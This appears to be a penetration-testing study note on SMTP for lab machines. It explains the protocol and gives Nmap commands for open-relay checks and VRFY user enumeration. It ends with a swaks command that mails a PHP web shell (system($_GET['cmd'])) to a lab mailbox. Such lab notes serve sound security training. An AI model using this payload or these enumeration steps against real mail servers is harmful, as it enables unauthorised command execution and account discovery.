---
tags: [enum, linux, smtp]
aliases: [SMTP]
---
Simple Mail Transfer Protocol (SMTP) is for sending emails in an IP network. SMTP servers accept connections on **port 25**. They also use **port 587** to receive mail from authenticated users/servers. When SMTP is SSL/TLS encrypted it will usually use **port 465**.

Typical usage is as follows: Mail User Agent (MUA) or SMTP client after sending an e-mail converts it into a header and a body an uploads both to the SMTP server. This then uses the Mail Transfer Agent (MTA), the software basis for sending and receiving e-mails. The MTA checks for e-mail size and spam and then stores it. To relieve, the MTA, it will be be preceded by a Mail Submission Agent (MSA), which checks the origin of the e-mail. The MSA is also called **Relay Server**. Finally, when it arrives to the destination SMTP server, the data is reassembled and then the Mail Delivery Agent (MDA) transfers it to the recipient's mailbox.

When people talk about SMTP, they are usually referring to Extended SMTP (ESMTP) which uses TLS, encrypting the entire connection.

# Default Script Scan

Use default scripts and version detection first to identify server capabilities.

```shell
# default Nmap scripts run `smtp-commands`
sudo nmap $HOST -sC -sV -p25
```

# Open Relay Check

A relay server is an SMTP server that is known and verified by all others. The sender usually authenticates himself to the relay server before using it. But, administrators have no idea which IP ranges (for the relay) they have to allow, therefore, they will allow all IP addresses not to cause errors in the email traffic. With an Open Relay configuration, the SMTP server can send fake emails and initialize communication between multiple parties, they can also spoof the email and read it (no authentication).

```shell
# identify the target SMTP server as an open relay
sudo nmap $HOST -p25 --script smtp-open-relay -v
```

# User Enumeration

SMTP can be vulnerable because users are not authenticated when a connection is established, therefore relays can be misused and sender addresses can be spoofed.

```shell
# can also use enumeration of users if server allows and a custom wordlist
sudo nmap 10.129.42.195 \
  -p25 \
  --script smtp-enum-users \
  --script-args 'smtp-enum-users.methods={VRFY},userdb=htb-wordlist.txt' \
  -v
```

SMTP does not confirm delivery, only giving an error message for an undelivered message.

# Sending Mail to an SMTP Server

We can verify what the inbox domain is for Postfix by visiting the `/etc/postfix/main.cf` file.

```shell
swaks \
  --server 10.129.227.180 \
  --port 25 \
  --from root@trick.htb \
  --to michael@trick.htb \
  --header 'Subject: Test' \
  --body '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>'
```

## Related

- [[email-attacks]]
- [[smb-attacks]]
- [[smb]]
- [[06-post-exploitation/credential-access/credential-hunting|Credential Hunting]]

